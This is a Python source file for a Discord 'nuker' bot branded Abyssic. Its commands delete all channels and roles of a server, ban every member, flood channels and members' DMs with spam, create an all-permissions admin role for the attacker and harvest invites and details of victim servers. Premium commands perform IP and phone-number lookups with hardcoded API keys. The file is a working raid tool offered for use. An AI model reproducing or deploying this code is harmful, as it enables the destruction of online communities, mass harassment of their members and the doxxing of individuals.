import logging as log
import sys
import asyncio
import io
import json
import random
import os
from datetime import datetime as dt
from typing import Union, Dict, Optional, List, Any

import discord
import httpx
from PIL import Image
import ipwhois
from discord.ext import commands as cmds
from rgbprint import Color, gradient_print


class Config:
    try:
        with open(os.path.join(sys.path[0], 'config.json'),
                  'r+',
                  encoding='utf8') as file:
            data = json.load(file)

            token: str = data['token']
            prefix: str = data['prefix']
            server_name: str = data['server_name']
            server_icon: str = data['server_icon']
            channels_name: str = data['channels_name']
            log_channel: Optional[discord.TextChannel] = None
            webhook_name: str = data['webhook_name']
            roles_name: str = data['roles_name']
            spam_message: str = data['spam_message']
            raid_cooldown: int = data['raid_cooldown']
            restr_guilds: List[int] = data['restr_guilds']
            premium_users: List[int] = data['premium_users']
            embed_config: List[Any] = data['embed_config']
            embed_title: str = embed_config['title']
            embed_description: str = embed_config['description']
            embed_image_url: str = embed_config['image_url']
            embed_color: int = 0x67060C
            embed_url: str = embed_config['url']

    except Exception as e:
        log.error(f'Error loading config.json: {e}')

    spam_embed: discord.Embed = discord.Embed(title=embed_title or None,
                                              description=embed_description
                                              or None,
                                              color=0x67060C,
                                              timestamp=dt.utcnow(),
                                              url=embed_image_url or None)
    spam_embed.set_image(url=embed_image_url or None)
    spam_embed.set_thumbnail(url=server_icon or None)


class Bot(cmds.Bot):

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)


bot: Bot = Bot(command_prefix=Config.prefix,
               intents=discord.Intents.all(),
               owner_ids={792977535264620546, 1136302112364572732},
               help_command=None)


class Utils:

    @classmethod
    def colorize(cls, text: str) -> str:
        return f'{Color.red}{text}{Color.reset}'

    @classmethod
    async def banner(cls) -> None:
        BANNER: str = '''

          :::     :::::::::  :::   :::  ::::::::   :::::::: ::::::::::: :::::::: 
       :+: :+:   :+:    :+: :+:   :+: :+:    :+: :+:    :+:    :+:    :+:    :+: 
     +:+   +:+  +:+    +:+  +:+ +:+  +:+        +:+           +:+    +:+         
   +#++:++#++: +#++:++#+    +#++:   +#++:++#++ +#++:++#++    +#+    +#+          
  +#+     +#+ +#+    +#+    +#+           +#+        +#+    +#+    +#+           
 #+#     #+# #+#    #+#    #+#    #+#    #+# #+#    #+#    #+#    #+#    #+#     
###     ### #########     ###     ########   ######## ########### ########

      '''
        devs: List[discord.User] = [
            await bot.fetch_user(id) for id in bot.owner_ids
        ]
        os.system('cls || clear')
        gradient_print(BANNER,
                       start_color=Color.light_yellow,
                       end_color=Color.red)
        log.info(f'Logged in as {cls.colorize(bot.user)}')
        log.info(f'prefix: {cls.colorize(bot.command_prefix)}')
        log.info(
            f'Commands: {cls.colorize(", ".join([cmd.name for cmd in list(bot.walk_commands())]))}'
        )
        log.info(
            f'Coded by {cls.colorize(", ".join(dev.name for dev in devs))}\n')


@bot.event
async def on_ready() -> None:
    status: discord.Status = discord.Status.invisible
    try:
        await bot.change_presence(status=status)
        await Utils.banner()

    except Exception as e:
        log.error(f'An error occurred while changing the status {e}')


@bot.event
async def on_command(ctx: cmds.Context) -> None:
    cmd: cmds.Command = ctx.command
    guild: discord.Guild = ctx.guild
    author: Union[discord.User, discord.Member] = ctx.author
    for id in bot.owner_ids:
        if id == 792977535264620546:
            dev: discord.User = await bot.fetch_user(id)
    embed: discord.Embed = discord.Embed(
        title=f'Command {cmd} Executed',
        description=
        f'Command executed by `{author.name}`\n`{guild.name} ({guild.id})`\nmembers: `{guild.member_count}`\nboost: `{len(guild.premium_subscribers)}`\nowner: `{guild.owner.name}`\ninvite: {(await ctx.channel.create_invite()).url}',
        color=0x67060C,
        timestamp=dt.utcnow())
    embed.set_author(name=dev, icon_url=dev.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    if Config.log_channel:
        await Config.log_channel.send(embed=embed)

    log.info(
        f'Command {Utils.colorize(cmd)} executed by {Utils.colorize(author)}')
    try:
        dm: discord.DMChannel = await author.create_dm()

        await dm.send(embed=embed)
    except Exception as e:
        log.error(f'An error occurred while sending the message {e}')


@bot.event
async def on_command_error(
        ctx: cmds.Context, exception: Union[cmds.CommandError,
                                            Exception]) -> None:
    author: Union[discord.User, discord.Member] = ctx.author
    for id in bot.owner_ids:
        if id == 792977535264620546:
            dev: discord.User = await bot.fetch_user(int(id))
    guild: Optional[discord.Guild] = ctx.guild or ctx.channel
    exception: Exception = getattr(exception, 'original', exception)
    embed: discord.Embed = discord.Embed(
        title=f'{bot.user.name} | {ctx.command} error',
        description=f'`{exception}`',
        color=0x67060C,
        timestamp=dt.utcnow())
    embed.set_author(name=dev, icon_url=dev.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)
    try:
        dm: discord.DMChannel = await author.create_dm()
        await ctx.send(embed=embed)
        await dm.send(embed=embed)
    except discord.Forbidden as e:
        log.error(f'An error occurred while creating DM {e}')

    except discord.HTTPException as e:
        log.error(f'An error occurred while sending the error message {e}')

    log.error(exception)
    await Utils.banner()


@bot.event
async def on_command_completion(ctx: cmds.Context) -> None:
    await Utils.banner()


@bot.event
async def on_guild_join(guild) -> None:
    if guild.member_count <= 10:
        await guild.leave()
        return

    embed: discord.Embed = discord.Embed(
        title=f'{bot.user} | Best Nuker',
        description=
        f'Logs of commands and errors will be sent by **DM**\n`{bot.command_prefix}utils help` to show my commands.',
        color=0x67060C,
        timestamp=dt.utcnow(),
        url='https://discord.gg/n7gx4PvcbR')

    try:
        async for entry in guild.audit_logs(
                action=discord.AuditLogAction.bot_add):
            if entry.target == bot.user:
                inviter: Union[discord.User, discord.Member] = entry.user
        dm: discord.DMChannel = await inviter.create_dm()
        await dm.send(embed=embed)
    except Exception as e:
        log.error(f'An error occurred while searching audit logs {e}')


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
    if channel.guild.id in Config.restr_guilds:
        return
        
    if channel.position == 0:
        return

    for _ in range(200):
        try:
            await channel.send(Config.spam_message, embed=Config.spam_embed)
            await asyncio.sleep(0.5)

        except Exception as e:
            log.error(f'An error occurred while spamming the message {e}')
        else:
            log.info(f'Spammed channel {Utils.colorize(channel)}')


@bot.event
async def on_guild_channel_update(
        before: Optional[discord.TextChannel],
        after: Optional[discord.TextChannel]) -> None:
    if after.guild.id in Config.restr_guilds:
        return
    if not isinstance(after, discord.TextChannel):
        return

    for _ in range(200):
        try:
            await after.send(Config.spam_message, embed=Config.spam_embed)
            await asyncio.sleep(0.5)

        except Exception as e:
            log.error(f'An error occurred while spamming the message {e}')
        else:
            log.info(f'Spammed channel {Utils.colorize(after)}')


@bot.group(name='c4', invoke_without_command=False)
@cmds.cooldown(rate=1, per=Config.raid_cooldown, type=cmds.BucketType.user)
async def c4(ctx: cmds.Context) -> None:
    if ctx.author.id in Config.premium_users:
        ctx.command.reset_cooldown(ctx)

    try:
        await ctx.message.delete()
    except Exception as e:
        log.error(f'An error occurred while deleting the message {e}')


@bot.group(name='premium', invoke_without_command=False)
async def premium(ctx: cmds.Context) -> None:
    pass


@bot.group(name='utils', invoke_without_command=True)
async def utils(ctx: cmds.Context) -> None:
    pass


@bot.group(name='devs', invoke_without_command=False)
async def devs(ctx: cmds.Context) -> None:
    pass


@c4.command(description=f'{bot.command_prefix}c4 nuke optional:<guild_id>')
async def nuke(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)
    tasks: List[Callable[..., Awaitable]] = []

    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for channel in guild.channels:
        try:
            tasks.append(channel.delete())
        except:
            pass
        else:
            log.info(f'Deleted channel {Utils.colorize(channel)}')

    await asyncio.gather(*tasks)
    channel: discord.TextChannel = await guild.create_text_channel(
        bot.command_prefix)
    await channel.send(Config.spam_message, embed=Config.spam_embed)


@c4.command(name='raid',
            description=f'{bot.command_prefix}c4 raid optional:<guild_id>')
async def raid(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    response: httpx.Response = httpx.get(Config.server_icon)
    guild_icon: bytes = response.content
    tasks: List[Callable[..., Awaitable]] = []

    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return
    await guild.edit(name=Config.server_name, icon=guild_icon)
    for _ in range(50):
        try:
            tasks.append(guild.create_text_channel(Config.channels_name))
        except:
            pass
        else:
            log.info(f'Created channel {Utils.colorize(Config.spam_message)}')

    await asyncio.gather(*tasks)


@c4.command(
    name='on',
    description=f'{bot.command_prefix}c4 on optional<guild_id>',
)
async def start(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    await nuke(ctx, guild_id)
    await raid(ctx, guild_id)


@c4.command(
    name='massban',
    description=f'{bot.command_prefix}c4 massban optional:<guild_id>',
)
async def mass_ban(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    bot_member: Optional[discord.Member] = guild.get_member(bot.user.id)
    tasks: List[Callable[..., Awaitable]] = []
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for member in [
            member for member in guild.members
            if not member in (ctx.author, bot.user)
    ]:

        if bot_member.top_role.position > member.top_role.position:
            try:
                tasks.append(guild.ban(member))
            except:
                pass
            else:
                log.info(f'Executed member {Utils.colorize(member)}')

    await asyncio.gather(*tasks)


@c4.command(
    name='admin',
    description=f'{bot.command_prefix}c4 admin optional:<guild_id>',
)
async def get_admin(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    author: Union[discord.User, discord.Member] = ctx.author
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return
    role: discord.Role = await guild.create_role(
        name=bot.command_prefix, permissions=discord.Permissions().all())
    try:
        await author.add_roles(role)
    except:
        pass
    else:
        log.info(
            f'Role added {Utils.colorize(role)} to {Utils.colorize(author)}')


@c4.command(name='massdm',
            description=f'{bot.command_prefix}c4 massdm optional:<guild_id>')
async def mass_dm(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(int(guild_id))
        await asyncio.sleep(0.05)

    tasks: List[Callable[..., Awaitable]] = []
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for member in [
            member for member in guild.members
            if not member in (ctx.author, bot.user)
    ]:
        channel: discord.DMChannel = await member.create_dm()
        for _ in range(19):
            try:
                tasks.append(
                    channel.send(Config.spam_message, embed=Config.spam_embed))
            except:
                pass
            else:
                log.info(f'Spammed DM {Utils.colorize(channel)}')

    await asyncio.gather(*tasks)


@c4.command(name='delroles',
            description=f'{bot.command_prefix}c4 delroles optional:<guild_id>')
async def del_roles(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    tasks: List[Callable[..., Awaitable]] = []
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for role in [role for role in guild.roles if role.name != 'everyone']:
        try:
            tasks.append(role.delete())
        except:
            pass
        else:
            log.info(f'Deleted role {Utils.colorize(role)}')

    await asyncio.gather(*tasks)


@c4.command(
    name='mkroles',
    description=f'{bot.command_prefix}c4 mkroles optinal:<guild_id>',
)
async def make_roles(ctx: cmds.Context,
                     guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild

    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    tasks: List[Callable[..., Awaitable]] = []
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for _ in range(250 - len(guild.roles)):
        try:
            tasks.append(guild.create_role(name=Config.roles_name))
        except:
            pass
        else:
            log.info(f'Created role {Utils.colorize(Config.roles_name)}')

    await asyncio.gather(*tasks)


@utils.command(description=f'{bot.command_prefix}utils help')
async def help(ctx: cmds.Context) -> None:
    author: Union[discord.User, discord.Member] = ctx.author
    for id in bot.owner_ids:
        if id == 792977535264620546:
            dev: discord.User = await bot.fetch_user(int(id))

    embed: discord.Embed = discord.Embed(
        title=f'{bot.user.name} | Commands',
        description=
        f'Below is a list of my available **commands**.\n> My prefix is: **{bot.command_prefix}**',
        color=0x67060C,
        timestamp=dt.utcnow(),
    )

    embed.set_author(name=dev, icon_url=dev.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    for cmd in list(bot.walk_commands()):
        if isinstance(cmd, cmds.Group):
            embed.add_field(name=cmd.name, value='', inline=False)
        else:
            embed.add_field(name=cmd.name,
                            value=f'`{cmd.description}`',
                            inline=False)

    await ctx.send(embed=embed)


@premium.command(name='proxy',
                 description=f'{bot.command_prefix}premium proxy')
async def gen_proxy(ctx: cmds.Context) -> None:
    with open(os.path.join(sys.path[0], 'config.json'), 'r',
          encoding='utf8') as file:
        data: Dict[Any, Any] = json.load(file)
    author: Union[discord.User, discord.Member] = ctx.author
    if not ctx.author.id in data['premium_users']:
        await ctx.send('U need buy premium to use this command')
        return
    guild: discord.Guild = ctx.guild
    PROXIES_URL: str = 'https://api.openproxylist.xyz/http.txt'
    response: httpx.Response = httpx.get(PROXIES_URL)
    proxy_list: List[str] = response.text.split('\n')
    random_proxy: str = random.choice(proxy_list)

    async def get_ip_info(proxy_ip: str) -> Dict[str, str]:
        IP_INFO_TOKEN: str = '6f26bc9173a068'
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(
                    f'https://ipinfo.io/{proxy_ip}/json?token={IP_INFO_TOKEN}')

            if not response.status_code == 200:
                return {'error': 'No se pudo obtener la información de la IP'}

            data: Dict[str, Optional[str]] = response.json()
            return {
                'region': data.get('region', 'No disponible'),
                'country': data.get('country', 'No disponible'),
                'city': data.get('city', 'No disponible'),
                'org': data.get('org', 'No disponible')
            }
        except Exception as e:
            return {'error': str(e)}

    proxy_ip: str = random_proxy.split(':')[0]
    ip_info: Dict[str, str] = await get_ip_info(proxy_ip)

    embed: discord.Embed = discord.Embed(
        title='Proxy Stack',
        description=f'Your proxy has been **generated**.\n> `{random_proxy}`',
        color=0x67060C,
        timestamp=dt.utcnow(),
    )
    embed.set_author(name=author, icon_url=author.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    for field in ip_info:
        embed.add_field(name=field, value=f'`{ip_info[field]}`', inline=False)

    await ctx.send(embed=embed)


@utils.command(name='info', description=f'{bot.command_prefix}utils info')
async def info(ctx: cmds.Context) -> None:
    author: Union[discord.User, discord.Member] = ctx.author
    guild: Optional[discord.Guild] = ctx.guild or ctx.channel
    devs: List[discord.User] = []
    for id in bot.owner_ids:
        if id == 792977535264620546:
            dev: discord.User = await bot.fetch_user(id)
        devs.append(await bot.fetch_user(id))

    INFO: Dict[str, Any] = {
        'developers': ', '.join(dev.name for dev in devs),
        'latency': f'{round(bot.latency * 1000)}ms',
        'servers': len(bot.guilds),
        'users': len(bot.users),
        'commands': len(list(bot.walk_commands())),
        'library': 'discord.py',
    }
    embed: discord.Embed = discord.Embed(
        title=f'{bot.user.name} | Info',
        description=
        f'Below is a list of my **information**.\n> My prefix is: **{bot.command_prefix}**',
        color=0x67060C,
        timestamp=dt.utcnow(),
    )
    embed.set_author(name=dev, icon_url=dev.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    for data in INFO:
        embed.add_field(name=data, value=f'`{INFO[data]}`', inline=True)

    await ctx.send(embed=embed)


@premium.command(name='iplookup',
                 description=f'{bot.command_prefix}premium iplookup <ip>')
async def ip_look_up(ctx: cmds.Context, ip: Optional[str] = None) -> None:
    with open(os.path.join(sys.path[0], 'config.json'), 'r',
          encoding='utf8') as file:
        data: Dict[Any, Any] = json.load(file)

    if not ctx.author.id in data['premium_users']:
        await ctx.send('U need buy premium to use this command')
        return
    
    if not ip:
        await ctx.send('Please provide an IP address.')
        return

    try:
        data: Dict[Any, Any] = ipwhois.IPWhois(ip).lookup_rdap()
        output: str = json.dumps(data, indent=4)
        file: io.BytesIO = io.BytesIO(output.encode())
        await ctx.send(
            file=discord.File(file, filename='abyssic_ip_lookup.json'))
    except Exception as e:
        await ctx.send(
            f'> An error occurred while looking up the IP address: {e}')


@devs.command(name='addpremium',
              description=f'{bot.command_prefix}devs addpremium <user>')
async def add_premium(ctx: cmds.Context, user: discord.User) -> None:
    if ctx.author.id not in bot.owner_ids:
        await ctx.send('You are not authorized to use this command.')
        return

    if user.id in Config.premium_users:
        await ctx.send('This user is already in the premium list.')
        return
    with open(os.path.join(sys.path[0], 'config.json'), 'r',
              encoding='utf8') as file:
        data: Dict[Any, Any] = json.load(file)

    data['premium_users'].append(user.id)

    with open(os.path.join(sys.path[0], 'config.json'), 'w',
              encoding='utf8') as file:
        json.dump(data, file, indent=4)
    await ctx.send(f'**{user.name}** has been added to the premium list.')


@premium.command(name='phlookup',
                 description=f'{bot.command_prefix}premium phlookup <number>')
async def ph_lookup(ctx: cmds.Context, *, number: Optional[str] = None):
    with open(os.path.join(sys.path[0], 'config.json'), 'r',
              encoding='utf8') as file:
        data: Dict[Any, Any] = json.load(file)

    if not ctx.author.id in data['premium_users']:
        await ctx.send('U need buy premium to use this command')
        return

    if number is None:
        await ctx.send(f'Please provide a phone number.')

    for id in bot.owner_ids:
        if id == 792977535264620546:
            dev: discord.User = await bot.fetch_user(id)

    API_KEY: str = 'e7bdba151a8ce1c06410d5e56ec00225'
    url: str = f'http://apilayer.net/api/validate?access_key={API_KEY}&number={number}'
    embed: discord.Embed = discord.Embed(
        title='PH Lookup',
        description='Your phone has been **looked up**.',
        color=0x67060C,
        timestamp=dt.utcnow(),
    )
    embed.set_author(name=dev, icon_url=dev.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    async with httpx.AsyncClient() as client:
        response: httpx.Response = await client.get(url)

        if response.status_code == 200:
            data: Dict[Any, Any] = response.json()

            for field in data:
                embed.add_field(name=field, value=f'`{data[field]}`')
    await ctx.send(embed=embed)


@utils.command(name='avatar',
               description=f'{bot.command_prefix}utils avatar optional:<user>')
async def avatar(ctx, user: Optional[discord.User] = None):
    if user is None:
        avatar_url: str = ctx.author.avatar.url
    else:
        avatar_url: str = user.avatar.url
    async with httpx.AsyncClient() as client:
        response: httpx.Response = await client.get(avatar_url)
        imagen_avatar: bytes = response.content

    img_avatar: Image.Image = Image.open(io.BytesIO(imagen_avatar))
    img_avatar: Image.Image = img_avatar.resize((520, 520))

    img_final: Image.Image = Image.new('RGBA', (520, 520), (0, 0, 0, 0))
    URL_PNG: str = 'https://i.ibb.co/zHm4JWDn/abc2.png'
    async with httpx.AsyncClient() as client:
        response: httpx.Response = await client.get(URL_PNG)
        imagen_png: bytes = response.content

    img_png: Image.Image = Image.open(io.BytesIO(imagen_png))
    img_png: Image.Image = img_png.resize((340, 340))
    img_final.paste(img_avatar.convert('RGBA'),
                    mask=img_avatar.convert('RGBA'))
    x: int = (img_final.size[0] - img_png.size[0]) // 2
    y: int = (img_final.size[1] - img_png.size[1]) // 2
    img_final.paste(img_png, (x, y), mask=img_png)

    buffer_img: io.BytesIO = io.BytesIO()
    img_final.save(buffer_img, format='PNG')
    buffer_img.seek(0)
    await ctx.send(file=discord.File(buffer_img, 'abyssic.png'))


@devs.command(
    name='leavesv',
    description=f'{bot.command_prefix}devs leavesv optional:<amount>')
async def leave_sv(ctx: cmds.Context, amount: Optional[int] = None) -> None:
    author: Union[discord.User, discord.Member] = ctx.author
    if ctx.author.id not in bot.owner_ids:
        await ctx.send('> You are not authorized to use this command.')
        return

    for guild in range(amount or len(bot.guilds)):
        for guild in bot.guilds:
            try:
                await guild.leave()
            except:
                pass
            else:
                log.info(f'Left guild: {guild.name}')
                dm: discord.DMChannel = await author.create_dm()
                await dm.send('All guilds have been left.')


@utils.command(name='inv', description=f'{bot.command_prefix}utils inv')
async def invite(ctx: cmds.Context) -> None:
    author: Union[discord.User, discord.Member] = ctx.author
    embed: discord.Embed = discord.Embed(
        title='Invite',
        description=
        f'Click [here](https://discord.com/oauth2/authorize?client_id=1338666279653085214&scope=bot&permissions=8) to invite me.',
        color=0x67060C,
        timestamp=dt.utcnow(),
    )
    embed.set_author(name=author, icon_url=author.avatar)
    embed.set_thumbnail(url=bot.user.avatar)
    embed.set_footer(text=bot.user.name, icon_url=bot.user.avatar)

    await ctx.send(embed=embed)


@devs.command(name='delpremium',
              description=f'`{bot.command_prefix}devs delpremium <user>`')
async def del_premium(ctx: cmds.Context,
                      user: Optional[discord.User] = None) -> None:
    if ctx.author.id not in bot.owner_ids:
        await ctx.send('You are not authorized to use this command.')
        return

    if user is None:
        await ctx.send('Please provide a user.')
        return

    with open(os.path.join(sys.path[0], 'config.json'), 'r',
              encoding='utf8') as file:
        data: Dict[Any, Any] = json.load(file)

    if user.id not in data['premium_users']:
        await ctx.send('This user is not in the premium list.')
        return

    try:
        data['premium_users'].remove(user.id)
    except:
        pass
    else:
        await ctx.send(
            f'**{user.name}** has been removed from the premium list.')
    with open(os.path.join(sys.path[0], 'config.json'), 'w',
              encoding='utf8') as file:
        json.dump(data, file, indent=4)
        file.truncate()


@devs.command(name='logchan',
              description=f'`{bot.command_prefix}devs logchan <channel>`')
async def log_channel(ctx: cmds.Context,
                      channel: Optional[discord.TextChannel] = None) -> None:
    if ctx.author.id not in bot.owner_ids:
        await ctx.send('You are not authorized to use this command.')
        return

    if channel is None:
        await ctx.send('Please provide a channel.')
        return

    if Config.log_channel is not None:
        await ctx.send('The log channel has been set.')
        return

    Config.log_channel = bot.get_channel(channel.id)
    await ctx.send(f'Log channel set to: {channel.mention}')


@c4.command(name='bypass',
            description=f'`{bot.command_prefix}c4 bypass optional:<guild_id>`')
async def bypass(ctx: cmds.Context, guild_id: Optional[int] = None) -> None:
    if guild_id is None:
        guild: discord.Guild = ctx.guild
    else:
        guild: discord.Guild = bot.get_guild(guild_id)

    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    tasks: List[Callable[..., Awaitable]] = []
    if guild.id in Config.restr_guilds:
        await ctx.send('Este comando no se puede utilizar en este servidor')
        return

    for channel in guild.channels:
        tasks.append(
            asyncio.create_task(channel.edit(name=Config.channels_name)))
    try:
        await asyncio.gather(*tasks)
    except:
        pass
    else:
        log.info(f'Channel bypassed on {Utils.colorize(guild.name)}')


if __name__ == '__main__':
    log.basicConfig(
        level=log.INFO,
        format=f'{Utils.colorize("[%(asctime)s]")} - %(message)s',
        datefmt='%I:%M:%S',
    )
    try:

        bot.run(Config.token)
    except Exception as e:
        log.error(f'An error occurred while logging into the client {e}')
        sys.exit()
